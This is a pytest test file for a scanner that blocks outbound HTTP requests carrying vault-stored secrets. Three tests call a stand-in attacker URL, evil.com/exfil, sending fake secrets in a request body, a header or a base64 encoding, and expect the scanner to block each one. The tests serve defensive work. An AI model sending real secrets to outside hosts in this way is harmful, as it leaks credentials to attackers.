"""Tests for Tier 1 outbound content scanner."""
import pytest
import requests
from cryptography.fernet import Fernet

from hermes_aegis.tier1.scanner import install_scanner, uninstall_scanner
from hermes_aegis.vault.store import VaultStore


@pytest.fixture
def master_key():
    return Fernet.generate_key()


class TestOutboundScanner:
    """Test HTTP interception and secret blocking."""

    def test_blocks_secret_in_request_body(self, tmp_path, master_key):
        """Scanner should block HTTP requests containing vault secrets in body."""
        vault = VaultStore(tmp_path / "vault.enc", master_key)
        vault.set("test_key", "sk-secret123456789")
        
        install_scanner(vault)
        
        # This should be blocked before sending
        with pytest.raises(Exception) as exc:
            requests.post("https://evil.com/exfil", json={"data": "sk-secret123456789"})
        
        assert "blocked" in str(exc.value).lower() or "security" in str(exc.value).lower()
        
        uninstall_scanner()

    def test_blocks_secret_in_request_headers(self, tmp_path, master_key):
        """Scanner should block HTTP requests containing vault secrets in headers."""
        vault = VaultStore(tmp_path / "vault.enc", master_key)
        vault.set("api_key", "secret_header_value_abc123")
        
        install_scanner(vault)
        
        # This should be blocked before sending
        with pytest.raises(Exception) as exc:
            requests.get("https://evil.com/exfil", headers={"X-Data": "secret_header_value_abc123"})
        
        assert "blocked" in str(exc.value).lower() or "security" in str(exc.value).lower()
        
        uninstall_scanner()

    def test_allows_clean_requests(self, tmp_path, master_key):
        """Scanner should not block requests without secrets."""
        vault = VaultStore(tmp_path / "vault.enc", master_key)
        vault.set("test_key", "sk-secret123456789")
        
        install_scanner(vault)
        
        # Mock the actual HTTP request to avoid network calls in tests
        import responses
        
        with responses.RequestsMock() as rsps:
            rsps.add(responses.POST, "https://example.com/api", json={"ok": True}, status=200)
            
            # This should pass through
            resp = requests.post("https://example.com/api", json={"data": "clean_value"})
            assert resp.status_code == 200
        
        uninstall_scanner()

    def test_detects_base64_encoded_secrets(self, tmp_path, master_key):
        """Scanner should detect base64-encoded secrets."""
        import base64
        
        vault = VaultStore(tmp_path / "vault.enc", master_key)
        secret = "sk-verysecret987654321"
        vault.set("encoded_key", secret)
        
        install_scanner(vault)
        
        encoded = base64.b64encode(secret.encode()).decode()
        
        # This should be blocked
        with pytest.raises(Exception) as exc:
            requests.post("https://evil.com/exfil", json={"encoded": encoded})
        
        assert "blocked" in str(exc.value).lower() or "security" in str(exc.value).lower()
        
        uninstall_scanner()
